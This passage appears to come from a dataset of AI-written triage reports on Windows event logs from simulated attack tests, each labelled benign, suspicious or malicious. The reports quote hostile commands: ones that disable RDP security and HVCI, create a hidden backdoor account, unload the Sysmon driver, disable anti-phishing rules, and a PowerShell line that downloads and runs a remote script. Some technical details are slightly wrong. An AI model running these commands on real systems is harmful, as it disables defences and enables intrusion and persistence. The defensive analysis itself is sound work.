   - The absence of security logs is concerning and suggests possible log tampering to hide tracks, especially in an investigation context.

### Resolution:

Based on the analysis, the logs are marked as **MALICIOUS**. The defined PowerShell script usage, especially relating to auditing bypass in conjunction with a potential absence of security logs, indicates a high likelihood of unauthorized or malicious activity on Server002. Immediate steps should be taken to:

- **Investigate further**: Interrogate the origin of the initial PowerShell script execution.
- **Check system integrity**: Ensure event logs have not been tampered with.
- **Review permissions and credentials**: Specifically around the `admin_test` user and any associated email or services.
- **Enhance monitoring and alerting**: For future similar activities to be caught early."
Enabling Remote Desktop Protocol via Remote Registry,"Upon reviewing the provided Sysmon log entries, the following analysis has been made:

1. **Use of wevtutil.exe**: The wevtutil.exe process, which is a command-line utility that enables the management of Windows event logs, was executed multiple times by the user `SERVER002\admin_test`. This can be normal activity for a system administrator managing event logs, but repeated use may warrant confirmation of legitimate activity, especially if combined with other suspicious behavior.

2. **Process Execution Analysis**:
   - **HOSTNAME.EXE** and **whoami.exe** were both executed by the user `SERVER002\\admin_test`. These utilities are common for environment diagnosis and typically benign. However, repeated execution without a clear purpose might indicate an attempt to gather system information.
   
3. **Suspicious Registry Modification**:
   - There is an execution of `cmd.exe` with a command line altering the Registry to change the RDP SecurityLayer setting via command `reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f`. Changing RDP settings, especially to disable security layers, can be a strong indicator of malicious activity. This action undermines the security of RDP sessions, potentially allowing an attacker to eavesdrop or compromise RDP connections.

4. **General Context**:
   - The Sysmon logs show the execution of common Windows components and utilities by a single user account (`SERVER002\admin_test`), and these operations are performed with high integrity level privileges, indicating elevated permissions.
   - Later in the logs, several system processes execute (like `sppsvc.exe`, `TrustedInstaller.exe`, and `MicrosoftEdgeUpdate.exe`), but they are executed under the `SYSTEM` account, which is typical and expected behavior for these services.

### Assessment:

- **BENIGN**: The initial operations involving `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe` can be considered benign by themselves, assuming they were performed by an administrator for regular monitoring and system checks.
  
- **MALICIOUS**: The registry change operation (`cmd.exe` modifying RDP security settings) indicates potential malicious intent or insider threat, as it weakens the security posture of the RDP connection on the host. This could allow unauthorized access or make the system vulnerable to external attacks. Such actions require more scrutiny and a review of user intentions.

### Resolution:

**MALICIOUS**

### Guidance:

1. **Immediate Action Required**:
   - **Revert Changes**: Revert the registry changes immediately to restore secure RDP settings.
   - **Identify User Intentions**: Engage with the user `SERVER002\admin_test` to verify the intention behind the registry modification. Determine if the actions were sanctioned and necessary for legitimate administrative work.

2. **Further Investigation**:
   - **Review User Activity**: Audit all actions by the `admin_test` user across the network and on specific critical systems.
   - **Additional Monitoring**: Enhance monitoring on `Server002` for any further suspicious changes, especially around RDP configuration and access attempts.
   
3. **Preventive Measures**:
   - Implement alerts for any future changes made to the RDP security settings in the registry.
   - Ensure only authorized personnel have the necessary permissions to modify critical system settings.

By following these measures, the organization can better secure its systems against unauthorized modifications and potential breaches."
Create Windows System File with Attrib,"After a careful analysis of the logs provided, here are the findings:

### Security Log Analysis:
The two events with EventID 4616 indicate time changes on the system, likely updates to the system time. These were performed by a process `svchost.exe` running under the `LOCAL SERVICE` account. This activity generally is benign and expected in a Windows system.

### Application Log Analysis:
The logs capture the stopping of the `edgeupdate` service. While service stops can sometimes be suspicious, there's no direct indication of malicious behavior with this log alone. The activity seems consistent with system updates or maintenance tasks.

### Sysmon Log Analysis:
- Multiple instances of `cmd.exe` and `conhost.exe` were executed with various command-line arguments. One notable command-line execution was `cmd.exe /c IF EXIST %%temp%%\\data.001.txt ( EXIT 0 ) ELSE ( EXIT 1 )`. This seems to be part of some scripted activity checking the existence of a file, which can be normal in administrative or automated tasks.
- The usage of `wevtutil.exe` multiple times indicates interactions with the Windows Event Logs. While this could hint at log tampering, there's no further supporting evidence indicating something out of the ordinary or malevolent.
- Several processes related to `Microsoft Edge Update` and its components executed various operations. These updates are routine and expected behavior for maintaining software versions.
- Finally, `whoami.exe` was run to display information about the logged-on user, which can be used in legitimate administrative scripts.

### Potentially Suspicious Observations:
1. **Frequent `cmd.exe` with specific checks** - The use of scripting, specifically checking for a file and attempting to modify its attributes (`attrib.exe +s`) could be either scheduled maintenance or an automated script run.
2. **`wevtutil.exe` Run**: Frequent execution suggests possible interaction with events logs which can be utilized for benign administrative purposes or for malicious activities like log tampering.
3. **File Attribute Modification** - Changing file attributes to system (`+s`) can hide files, which might be used by malware to conceal its presence. Without direct indication of tampering or obscure files, this is not conclusively malicious.

### Conclusion:
The logs show a mix of routine system updates and administrative activities with some elements worthy of caution, specifically the use of `wevtutil.exe` and file attribute modification commands. While none of the observations confirm definite malicious activity, they do suggest room for further review or contextual evaluation. None of the logs alone give sufficient evidence for a security compromise. However, due to some potentially suspicious behavior, it is recommended to further scrutinize these activities, focusing on the context and any parallel incidents or alerts.

### Final Resolution: **SUSPICIOUS**

#### Guidance on How to Proceed:
- Verify the context in which `cmd.exe` scripts and `wevtutil.exe` were executed. These could tie back to administrative scripts or scheduled tasks.
- Check for any alerts or parallel incidents in the time frame these logs were recorded.
- Consider monitoring for any continued use of `wevtutil.exe` and file modifications aligning with these patterns.
- Ensure that system updates and the Microsoft Edge Update processes verify against known safe hash values and were performed by legitimate update processes."
Invoke CHM with InfoTech Storage Protocol Handler,"**Detailed Analysis:**

- **Suspicious or Anomalous Behavior:**

  1. **PowerShell Event Logs:**
     - All PowerShell log events (EventID 600) demonstrate the usage of a PowerShell script with a relatively unusual function call, `Invoke-ATHCompiledHelp`. The command is executed via `powershell.exe` with arguments that include `$env:windir\hh.exe` and `Test.chm`. This behavior could potentially be legitimate depending on the organization's script usage policies, but it could also be suspicious, indicating possible obfuscation or an attempt to execute hidden actions (e.g., help file attacks).

  2. **Sysmon Events:**
     - The execution of PowerShell (Sysmon EventID 5 for process creation) is captured, confirming the PowerShell activity seen in the previous logs. There is a specific Process ID (3044) associated with `powershell.exe` using the same script/commands as noted above.
     - Frequent and clustered usage of `wevtutil.exe` and `conhost.exe` associated with the same user `SERVER002\admin_test`, process execution was noted. While `wevtutil.exe` is used for managing event logs, high frequency could be examined for data exfiltration or tampering attempts.

  3. **Security Events:**
     - The notable security event is EventID 4672, where special privileges are assigned to an account (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`), implying potentially risky behavior if unwarranted.

  4. **System and Windows Updates:**
     - Routine Windows Update logs indicate active update checks and installations, which appear benign. No specific issues or anomalies were observed here.

- **Malicious Activity or Compromise:**

  The usage of `Invoke-ATHCompiledHelp` in PowerShell without any clear documentation or known associations with legitimate processes suggests potential misuse or hidden activity, especially given it involves HTML Help executable (`hh.exe`). Typical indicators of script-based attacks could include similar patterns, but more context is generally required to confirm the malicious intent.

**Assessment:**

The event logs exhibit signs of potentially suspicious behavior, particularly around PowerShell usage and execution permissions. While the Windows Update logs and system activities seem benign, the potentially unfamiliar PowerShell script usage and Sysmon's frequent interfacing with event utilities indicate plausible cause for concern.

**Resolution:**

- **SUSPICIOUS**: The log entries exhibit signs consistent with suspicious activity requiring further investigation. Validation of the script’s legitimacy, scrutiny of the script’s origin, user intent behind these processes, and pattern analysis for potential misuse or compromise are recommended.

**Guidance:**

1. **Investigate `Invoke-ATHCompiledHelp` Usage:**
   - Determine if `Invoke-ATHCompiledHelp` is a known or sanctioned script within your organization.
   - Check for any documented usage or necessity of invoking `hh.exe` with `Test.chm`.
   - Verify the script’s source, changes, and access logs.

2. **Verify User Privileges:**
   - Inspect `SERVER002\admin_test` activities and necessary privilege assignment consistency.
   - Ensure elevated privileges are aligned with user roles and responsibilities.

3. **Monitor Event Logs:**
   - Continue monitoring for repeated, unusual PowerShell command lines with similar execution patterns.
   - Watch for high frequency action from `wevtutil.exe` and suspicious activity in conjunction with `Conhost.exe`.

4. **Conduct Host Verification:**
   - Perform a security audit on `Server002`, focusing on executed scripts, user action logs, and network communication.

Proceeding with the above actions should clarify the nature and intent behind these log entries and eliminate or confirm the presence of malicious activity."
office-365-Disable-AntiPhishRule,"### Detailed Analysis of the Logs:

#### **1. Windows PowerShell Log Analysis:**

- **Event IDs 1101-1117**: The PowerShell logs indicate the execution of potentially malicious scripts. A notable script pattern is observed: **`powershell.exe & {$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force...}`** followed by commands like **`Connect-ExchangeOnline`, `Get-AntiPhishRule`, and `Disable-AntiPhishRule`**. This highlights an attempt to connect to Exchange Online using empty credentials and disabling anti-phishing rules, which is a clear sign of malicious intent.
- **Security Concern**: The usage of PowerShell to disable security features without user consent, especially with commands that are interacting with Exchange Online, poses a direct threat.
  
#### **2. Sysmon Log Analysis:**

- **Event IDs**: The logs show multiple instances of processes, notably PowerShell (`powershell.exe`), being executed with high integrity levels. The script appears to be executed under a user account `SERVER002\\admin_test`, indicating elevated privileges, which is unusual as normal operations shouldn't typically disable security measures.
- **Process Execution**: The repetitive occurrence of execution involving `conhost.exe` combined with `powershell.exe` and manipulation scripts further emphasizes suspicious activity.

#### **3. Application Log Analysis:**

- **Event ID 2389**: Shows activity by the **Software Protection Platform Service**, but nothing immediately suspicious related to potential malicious activity beyond the regular timestamp and service interaction.

#### **4. System Log Analysis:**

- **Event IDs**: Mostly benign updates and kernel-related activities with no apparent direct link to suspicious external activities based on given event descriptions.

### **Assessment:**

- **Suspicious Activities Identified**: The PowerShell logs indicate potentially malicious scripts aimed at disabling security measures (Anti-Phishing Rules), which should not occur under normal administrative operations.
- **Risks**: If left unchecked, these scripts may lead to unchecked phishing attempts, data breaches, and unauthorized access to sensitive resources.

### **Recommendation:**

- Conduct a deeper investigation focusing on network traffic at the time of the events for potential data exfiltration.
- Examine system policy changes related to PowerShell usage and application whitelisting.
- Review user account `SERVER002\\admin_test` for unauthorized or suspicious actions outside of typical behavior.
- Reinstate any disabled security features and conduct a security audit to assess potential damage or compromised sections in the network.

### **Final Resolution:**

- **MALICIOUS**: The activities logged show clear signs of being a security compromise involving deliberate disabling of security protocols through PowerShell, posing a high risk to system integrity and data security. Immediate steps should be taken to mitigate potential exploitations."
Disable Hypervisor-Enforced Code Integrity (HVCI),"Upon analyzing the provided Windows event logs, the following suspicious activities can be identified:

1. **Execution of Powershell and Registry Alterations**:
   - Several events show executions of PowerShell with subsequent commands altering the Windows Registry. Particularly, there is a PowerShell command that modifies the following Registry key:
     - `HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity` and sets the value `Enabled` to `0`.
   - Command observed: `powershell.exe & {reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /t REG_DWORD /d 0 /f}`
   - This action disables Hypervisor-Enforced Code Integrity (HVCI), part of Device Guard, which is a security feature that helps prevent unauthorized code from running.

2. **CMD and REG.EXE Usage**:
   - The logs show the usage of `cmd.exe` and `reg.exe` to query `DeviceGuard` settings using specific command-line arguments. This suggests that someone or something is regularly querying and possibly attempting to manipulate security configuration settings on the host.
   - Commands like `\""C:\\Windows\\system32\\cmd.exe\"" /c \""reg query ...` repeatedly appear, which are typical in scripts that change the security posture of a host.

3. **Integrity Level and User Context**:
   - The activities are executed with a `High` integrity level under the user `SERVER002\admin_test`, indicating it was performed with administrative privileges, which broadens the impact potential if these actions are unauthorized.

4. **Edge Update Execution**:
   - Various entries related to the Microsoft Edge Update service were observed as running under `NT AUTHORITY\ SYSTEM`, which itself isn't suspicious but should be considered if its timing is concurrent with other unauthorized activities.

**Assessment and Guidance**:
- The repeated querying and modification attempts related to security configurations, particularly disabling HVCI, is highly irregular for standard operational behavior unless specifically authorized.
- Given the administrative privileges with which these commands are being run, potential unauthorized alteration of critical security settings is possible.
- The logs suggest an attempt to weaken the system's security defenses through registry modifications.

**Resolution**:
- **MALICIOUS**: Based on the registry modification attempting to disable a core security feature without clear authorized context, I would attribute this activity to a malicious nature. Immediate steps to investigate the source of these commands, verify administrative accounts, and assess system integrity should be taken.
- Additionally, review the user `admin_test` and scrutinize any associated scripts, scheduled tasks, or remote access activities to prevent future incidents.

It is recommended to:
- Conduct a full security audit of `Server002` and ensure all security features like HVCI are correctly configured and enforced.
- Verify and restrict administrative privileges to necessary personnel only.
- Continue monitoring the server for any further unauthorized activities."
Create Hidden User in Registry,"After thoroughly analyzing the provided logs, I have identified some events that stand out as potentially suspicious:

1. **User Account Creation and Registry Modification via Command Line:**
   - There is a command execution captured in the Sysmon logs indicating that a new user account ""fileOperator$"" was created using the `NET USER` command. The command also includes a password setting and specifies that the account never expires.

   ```plaintext
   ""cmd.exe"" /c NET USER fileOperator$ At0micRedTeam! /ADD /expires:never  & REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v fileOperator$ /t REG_DWORD /d 0
   ```

   - Following this, a registry modification is executed, hiding the new user account from the login screen by adding it to the ""SpecialAccounts\Userlist"".
   
2. **Security Log Events:**
   - Several security events (4720, 4722, 4732) in the security logs correspond to the user account ""fileOperator$"" being created, enabled, and added to the ""Users"" group on the domain SERVER002. These actions are logged as being performed by the user ""admin_test"".
   
3. **Potential Privilege Escalation or Misuse:**
   - The creation of a user account with the ability to hide it from the login screen could signal an attempt at privilege escalation or persistence by an attacker. The use of command line to perform both the account creation and registry modification in quick succession is particularly atypical for standard administrative behavior.

Based on this analysis:

- **Resolution: MALICIOUS**
  - The activity surrounding the creation and concealment of the ""fileOperator$"" account is indicative of a potential insider threat or compromised administrative credentials being used to plant backdoor access. The sequence of processes and registry modifications, executed with administrative privileges, warrants a classification of malicious activity.

**Recommended Next Steps:**
- **Immediate Investigation:** Confirm the legitimacy of the user ""admin_test"" and whether these activities were authorized.
- **Account Review:** Review and audit all recently created and modified accounts for unauthorized changes.
- **System Integrity Check:** Ensure that no unauthorized modifications have been made elsewhere in the system.
- **Further Monitoring:** Increase logging and monitoring on the server to detect additional suspicious activities.
- **Incident Response:** Engage the incident response team to conduct a broader network investigation to identify other potentially compromised systems or accounts."
Disable Windows Registry Tool,"Upon reviewing the provided log entries, here are some observations and conclusions regarding suspicious or anomalous behavior:

### Observations:

1. **Time Synchronization Events:**
   - There are multiple security-related events (EventID 4616) linked to time changes, likely due to synchronization with a remote NTP server. These events do not inherently appear suspicious since time synchronization is a standard system administrative activity.

2. **Edge Update-related Entries:**
   - There are entries showing Microsoft Edge Update activity, such as `MicrosoftEdgeUpdate.exe` and correlated processes. The logs showing `MicrosoftEdgeUpdate.exe` initiated by `NT AUTHORITY\SYSTEM` are consistent with normal update mechanisms.

3. **Usage of Windows Utilities:**
   - Several executions of command-line utilities like `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` by the user `SERVER002\admin_test`. Particularly, the `cmd.exe` logs indicate an attempt to modify registry settings: 
     - **Command:** `""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f`
     - This command is used to disable access to registry tools, which is typically suspicious if performed unexpectedly or without proper authorization, as it can indicate an attempt to prevent system administrators from viewing or modifying registry entries.

4. **Registry Modification:**
   - The execution of `reg.exe` by `SERVER002\admin_test` is aimed at disabling registry tools, which can indicate malicious intent as it attempts to limit administrative visibility and control over the registry.

5. **Execution of `wevtutil.exe`:**
   - The `wevtutil.exe` command is seen exporting logs to a temporary location. While this might be part of legitimate administrative activities, if unauthorized, this could signify log tampering or data exfiltration attempts.

### Assessment:
- **Suspicious Behavior Identified:**
  - The command executed via `cmd.exe` to disable registry tools is particularly suspicious without prior context or justification, as it directly impacts administrative capabilities on the host.
  - The use of `wevtutil.exe` to export logs should be verified against known administrative activities to rule out any unauthorized attempts to alter or analyze logs externally.

### Threats or Risks Identified:
- The command to disable registry tools represents a potential threat to the integrity and security of the system, suggesting an attempt to obscure activities from legitimate system administrators.
- Unauthorized export or modification of logs could lead to clearing or tampering with crucial evidence if malicious activities are underway.

### Guidance to Proceed:
1. **Immediate Review:** Confirm with system administrators if the actions tied to `cmd.exe` and `wevtutil.exe` were legitimate and authorized. If not, initiate further investigations into the user actions and intentions of `SERVER002\admin_test`.
2. **Monitoring and Audit:** Implement heightened monitoring on host Server002 to ascertain no further unauthorized activities are being executed.
3. **User Action Surveillance:** Ensure thorough surveillance and review of user actions associated with `SERVER002\admin_test`, identifying any additional deviations from expected behavior.
4. **Registry and Logs Inspection:** Conduct a review of the registry settings to confirm the impact of the command executed and verify the integrity of system and application logs.

### Resolution:
Given the identified issues primarily revolving around the command meant to disable registry tools and the usage of `wevtutil.exe`, the resolution is **SUSPICIOUS**. Further investigation is necessary to determine if these actions were executed with legitimate intent or with potential malicious objectives."
System File Copied to Unusual Location,"Based on the analysis of the given logs, here are the key observations:

1. **Security Log (EventID 5379):** The repeated attempts to read Microsoft account and Windows Live credentials resulted in failure (ReturnCode=""3221226021""). Frequent failed access attempts can potentially indicate enumeration or unauthorized access attempts.

2. **Sysmon Logs:**
   - Usage of ""whoami.exe"" and ""conhost.exe"" is generally benign, and these are legitimate Windows binaries.
   - Execution of ""PowerShell.exe"" with a command line that includes copying `cmd.exe` to `C:\ProgramData` and executing it may indicate an attempt to gain persistence or elevate privileges. This action is suspicious, given that `cmd.exe` was copied and executed from an unconventional directory, `C:\ProgramData`.
   - The `cmd.exe` process executed from `C:\ProgramData\cmd.exe` indicates that the previous PowerShell script was probably successful in executing. This is particularly concerning as it indicates potential abuse of PowerShell to perform unauthorized actions.
   
3. **System Log:** There is evidence of a Windows Update and Security Intelligence Update for Microsoft Defender Antivirus. The presence of updates is typical for maintaining system security and does not seem directly linked with the malicious activity indicated in the PowerShell and Sysmon logs.

4. **Windows PowerShell Log:** This shows the execution of a PowerShell script that was used to copy `cmd.exe` and execute it. The script execution details align with the suspicious activity noted earlier from the Sysmon logs.

**Assessment:**
The logs indicate suspicious behavior through the PowerShell activity and unconventional execution of `cmd.exe`. The attempts to manipulate and execute system utilities in non-standard ways suggest potential malicious intent, possibly involving privilege escalation techniques or persistence mechanisms.

**Resolution: MALICIOUS**
- Given the suspicious PowerShell activity and subsequent execution of `cmd.exe` in an unusual manner, this activity is assessed to be malicious. Immediate action should be taken to contain the affected host and investigate further. Potential steps include:
  - Performing a thorough forensic investigation on the server to determine the full scope of the breach.
  - Identifying any unauthorized changes made to the system.
  - Enhancing monitoring and detection capabilities, particularly around the use of PowerShell and sensitive system utilities.
  - Reviewing and tightening security policies to prevent such activities in the future, like implementing execution policy restrictions for PowerShell."
attrib - hide file,"Upon reviewing the provided logs, I have gathered the following observations:

1. **Time Change Events (Security Logs)**
   - There are two event entries (Event ID: 4616) indicating that the system time was changed by the `LOCAL SERVICE` account, via the process `svchost.exe`. Minor time changes are often associated with legitimate system operations, such as synchronization with a time server. Given no other associated anomalies or suspicious timestamps marking a deviation, these activities appear consistent with typical system operations.

2. **Process Execution (Sysmon Logs)**
   - Use of common Windows utilities (`whoami.exe`, `hostname.exe`, `cmd.exe`, `conhost.exe`, `attrib.exe`): These processes are commonly used for legitimate administrative tasks.
   - Command lines involving `cmd.exe` demonstrate the creation of hidden directories and files (`attrib.exe` +h attribute). Although it could be related to legitimate script execution, hiding files could be deemed suspicious if it's out of normal administrative routines by the `admin_test` user.
   - Notably, the execution of `cmd.exe` with commands to create and hide files suggest potential obfuscation efforts or script-based operations which may warrant closer inspection of user activity or policies governing script usage.

3. **Software Update and System Services**
   - Multiple executions of `MicrosoftEdgeUpdate.exe`, `TrustedInstaller.exe`, and `sppsvc.exe` indicate scheduled updates or validation activities. There's no indication that these are responsible for any notable system changes.

4. **Kernel and Time Services (System Logs)**
   - The logs show regular system time and kernel operations, in conjunction with network time synchronization, all seemingly routine without deviation in process IDs or service anomalies.

5. **Unusual Behavior Not Noted**
   - There are no clear indicators of malware, such as execution of unknown or cryptographic hash-matched malicious files, privilege escalation, lateral movement techniques, or immediate signs of the abnormal dataset access/net surges characteristic of typical compromise methods.

### Assessment & Resolution:
- **SUSPICIOUS**: While most activities observed align with normal system operations, the execution of command lines involving file concealment (`attrib.exe` with +h) from a user account is slightly off the norm. This is not immediately linked to known malicious behavior but does raise a flag for further investigation. Consequently, this warrants a more focused review on user activity (who is `admin_test`) alongside corroborative log sources such as PowerShell, potentially overlooked system policies, script origins and further network traffic analysis. Checking for any policy or behavioral deviations would be prudent.

### Guidance:
- **Further Investigation**: Examine the context within which the `admin_test` account operates (Check-box adherence for legitimate administrative activities). Peering into other logs not provided (like PowerShell, detailed auth, or access logs) should affirm broader context and assure compliance with usage patterns. Monitoring or alerts specific to command-line executions can preemptively catch any iterations of such events.
- **User Awareness**: Ensure user training on script use policies and its implications. Inform your teams on recognizing legitimate vs suspicious behavior execution norms within their operational infrastructure scope.
"
Store file in Alternate Data Stream (ADS),"Upon review of the Windows event logs provided, the following analysis has been conducted:

1. **Sysmon Logs**:
   - We observe multiple instances of legitimate system executables like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` running under the user `SERVER002\admin_test`. Individually, these are not concerning as they are standard system tools.
   - The execution of `powershell.exe` is noteworthy. The command line used indicates an action to create a directory at `C:\Users\Public\Libraries\yanki`, followed by a suspicious command to interact with `desktop.ini`, indicating potential use of Alternate Data Streams (ADS). This activity is unusual and may suggest covert data storage or attempts to remain undetected.

2. **System Logs**:
   - A time discrepancy is detected where the system time was reverted from `2024-10-28 13:48:21.4839978` to `2024-10-28 13:48:15.5997069`. This action, recorded by event ID 4616 in the Security logs, often signifies attempts to circumvent logging and can be a strong indicator of malicious intent.

3. **Application Logs**:
   - The logs indicate standard updates and service actions from the `edgeupdate` provider, consistent with update mechanisms for Microsoft Edge. No anomalies are detected here.

4. **Security Logs**:
   - The time change noted earlier is logged here without additional anomalies beyond the concerning time discrepancy.

5. **Windows PowerShell Logs**:
   - The execution of a PowerShell script with potential ADS usage, as observed in the Sysmon logs, is confirmed here. This script can be used to hide or transfer data illicitly, an indication of potentially malicious behavior.

**Assessment**:
- The presence of legitimate tools such as `wevtutil.exe` and `whoami.exe` executing is not inherently malicious, but coupled with the suspicious PowerShell activity and especially the time manipulation, there are indicators that raise concerns about the integrity of the system.
- The time change is a red flag in the context of system compromise as it typically suggests efforts to evade detection.

**Resolution**:
- **SUSPICIOUS**: The logs contain activity that doesn't align with standard operations and suggests that further investigation is warranted. Particularly, the combination of time manipulation and PowerShell script execution with suspicious command-line arguments indicates potential compromise.

**Guidance on How to Proceed**:
1. **Immediate Actions**:
   - Isolate the host `Server002` from the network to prevent potential lateral movement or data exfiltration.
   - Conduct a thorough review of any changes made during the period of the time discrepancy and cross-reference with other logging sources.

2. **Investigation**:
   - Perform a full forensic analysis on `Server002` to assess for any unauthorized access or changes made outside of expected baselines.
   - Analyze any data linked with the PowerShell script's intention, especially regarding the directory and files associated with ADS.

3. **Remediation**:
   - Consult with IT and security teams to patch any vulnerabilities or misconfigurations that may have enabled such activity.
   - Review access controls and logging configurations to prevent future incidents."
Lolbin Gpscript logon option,"Upon analyzing the provided event logs, I have identified several key observations and points of interest. Here is a detailed analysis:

### 1. **Security Logs:**
- The security logs primarily depict EventID 4616, which indicates system time changes by the svchost.exe process running under the ""LOCAL SERVICE"" account. This behavior can be normal for system processes managing time synchronization; in this case, it's typically benign, especially since it is carried out by svchost.exe, a system process often associated with legitimate services.

### 2. **Sysmon Logs:**
- The Sysmon logs show extensive process creation activity associated with wevtutil.exe and conhost.exe, both being legitimate Windows system processes. There doesn't appear to be any suspicious command-line arguments or unusual execution paths for wevtutil.exe.
- Regular execution of utilities like `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` performing a Gpscript /logon task can be relatively typical in systems where scripts are used for logging user actions or configurations.
- Microsoft Edge Update processes (e.g., MicrosoftEdgeUpdate.exe) running various tasks appear to be part of regular software updates, showing processes like MicrosoftEdgeUpdateComRegisterShell64.exe.

### 3. **System Logs:**
- The presence of Kernel-General and Time Service logs, highlighting time adjustments and time source selections, further corroborates the timings seen in the Security logs and show regular system synchronization activities.

### 4. **Application Logs:**
- The application log entries for ""Microsoft-Windows-Security-SPP"" and ""edgeupdate"" align with the Edge update activities seen in Sysmon logs and do not raise immediate red flags.

### **Assessment:**

After a thorough review of the logs, there is no immediate evidence of malicious activity. The logs reveal typical system processes executing as expected, with no unusual command-line arguments, folder permissions, or indicators of compromise. 

### **Resolution: BENIGN**

**Conclusion:**
The activities captured within these logs appear to be legitimate, associated with expected system operations, including time synchronization services and software updates. Given this context and the lack of recognizable malicious signature patterns, the resolution should be classified as **BENIGN**. However, as a best practice, it's recommended to continuously monitor server activities for any new or emerging threat patterns."
Unload Sysmon Filter Driver,"After a detailed analysis of the provided Windows event logs, here's a summary of findings related to any suspicious or anomalous behavior:

### Key Observations:
1. **Use of PowerShell and Command-Line Utilities:**
   - There is a creation of multiple processes (`fltMC.exe`, `findstr.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe`) initiated by `powershell.exe` and `cmd.exe`. The command line `fltmc.exe unload SysmonDrv` is particularly noteworthy as it indicates an attempt to unload the Sysmon driver. This sort of activity could be an indication of tampering to evade detection.

2. **System Time Manipulation:**
   - Multiple `EventID 4616` from the Security log indicate changes in system time, which could be an evasion technique used by an attacker to disrupt log integrity and timeline analysis.

3. **High Integrity Level:**
   - Process executions (e.g., PowerShell, cmd.exe) are running at a high integrity level under the user `SERVER002\admin_test`, which implies administrative privileges are being used, increasing the risk of malicious activity with elevated rights.

4. **Process Ancestry:**
   - The parent process for several events is `wsmprovhost.exe` which is a legitimate Windows process used for PowerShell-based remote management, but within the context of these logs, its command line arguments (embedding) and its role as a parent process need further examination due to its association with potentially suspicious activities.

5. **Failed Driver Operations:**
   - A Sysmon event (ID 255) indicates a failure to retrieve events due to an aborted I/O operation related to `DriverCommunication`, suggesting possible interference with the Sysmon logging mechanism.

### Assessment:
Based on the sequence of events, particularly the unloading of Sysmon driver (`SysmonDrv`) and the multiple changes of system time, there is enough evidence to consider this behavior as suspicious. The use of administrative privileges for these actions elevates the severity of these events. 

### Resolution:
**SUSPICIOUS -** The logs contain activity that doesn't look right and needs more investigation. The attempt to unload Sysmon could indicate a deliberate move to cover tracks, and the time manipulation could be an attempt at forensic evasion. Follow-up steps would include:
- Investigate the legitimacy of the `admin_test` user and their intended activities.
- Validate why `SysmonDrv` is being unloaded and whether this coincides with any IT policies or procedures.
- Reconstruct the event timeline around the periods of time changes to check for manipulated timestamps or unauthorized actions.
- Check for other systems where similar activity might be occurring as part of a broader compromise.

Given the findings, further investigation and potentially alerting relevant security teams would be prudent to ensure no ongoing or future compromises."
Service Registry Permissions Weakness,"After analyzing the provided logs, here are the key observations and assessments:

### PowerShell Logs:
- **Event Records 1043-1049** show a series of PowerShell invocations using `get-acl` to retrieve access control lists for registry keys, particularly targeting `HKLM\SYSTEM\CurrentControlSet\Services\*` and a specific service `weakservicename`. The use of `get-acl` for registry keys can be legitimate but can also indicate reconnaissance or attempts to find weak or misconfigured services for exploitation.

### Application Logs:
- **Security SPP and Edge Update Entries**: The Software Protection Platform Service and Edge Update service logs entries that show typical service behavior. They do not indicate malicious activity.

### System Logs:
- **Kernel-General and Time-Service Events**: These events reflect minor adjustments in system timing, likely due to synchronization with an NTP server (`time.windows.com`). This behavior is normal and expected in Windows environments.

### Sysmon Logs:
- **Process Creations**: Numerous process creations involving standard Windows utilities (`whoami.exe`, `conhost.exe`) and Microsoft Edge Update processes. The frequent invocation of MicrosoftEdgeUpdate could suggest an update or possibly excessive process creation due to configuration or issues, but these entries themselves don't directly imply malicious activity.

### Security Logs:
- **Security Audit Events 4616**: These show time change events which coincide with the System log events and are part of regular operations.

## Assessment:
**SUSPICIOUS** - There is one aspect in the logs that is notable:
- The PowerShell events indicate potential reconnaissance activity. The `get-acl` operation specifically targeting services, especially a named service `weakservicename`, could suggest information gathering possibly for privilege escalation or lateral movement. This warrants further investigation into what triggered these events and who executed the commands, as they may indicate preparatory steps in an attack chain.

## Recommendations:
1. **Investigate the Origin**: Determine who or what executed the PowerShell command. Correlate this activity with user access logs and network activity.
2. **Review Service Configurations**: Investigate the specific service `weakservicename` in the registry. Check for weak permissions or configurations that could be exploited.
3. **Conduct a Threat Hunt**: Look for similar patterns in historical logs or across other systems within the network that could indicate a broader strategy.
4. **Enhance Monitoring**: Implement enhanced monitoring for PowerShell activity, especially those involving `get-acl` and other commands targeting system permissions.

In conclusion, while there is no conclusive evidence of active malicious activity, the patterns in the PowerShell logs merit a closer look to ensure there is no underlying threat."
Clear Event Logs via VBA,"## Detailed Analysis of the Logs:

### Observations:
1. **Security Log:**
   - Multiple instances of **Event ID 4624** indicate successful account logons using SYSTEM account which is a standard process for background tasks initiated by the OS.
   - **Event ID 4672** shows that the SYSTEM account was granted special privileges, which are typical for system-level tasks.
   - **Event ID 5379** shows credential validation failures related to Windows Live and Microsoft Account, which are typical of system services or misconfigured services trying to authenticate.
   - **Event ID 4798** reveals enumeration of local accounts by taskhostw.exe, which is common for system maintenance and update tasks.

2. **Sysmon Log:**
   - **PowerShell Execution** with malicious intent was triggered. The command found was:
     ```powershell
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); Invoke-Maldoc -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\data.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""}
     ```
     - This command downloads and executes a script from a remote source, indicative of suspicious and potentially malicious activity.
